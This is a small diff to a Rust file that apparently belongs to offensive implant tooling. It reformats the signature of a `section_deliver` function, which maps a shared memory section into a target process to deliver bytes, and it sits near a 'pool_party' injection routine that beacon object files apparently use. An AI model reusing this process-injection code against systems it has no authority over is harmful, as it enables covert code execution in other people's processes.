@@ -463,10 +463,7 @@ unsafe fn pool_party_map_target(
 /// both views exist — the views keep the object alive, and a BOF per beacon
 /// cycle must not leak one handle per run. On any failure the local view is
 /// unmapped and the section handle closed before `Err`.
-pub(crate) unsafe fn section_deliver(
-    target_h: *mut c_void,
-    bytes: &[u8],
-) -> Result<usize, String> {
+pub(crate) unsafe fn section_deliver(target_h: *mut c_void, bytes: &[u8]) -> Result<usize, String> {
     let (create_section, map_view, unmap_view, _query_thread) =
         resolve_section_fns().ok_or_else(|| String::from("ntdll section exports missing"))?;
     // GetCurrentProcess pseudo-handle = (HANDLE)-1.
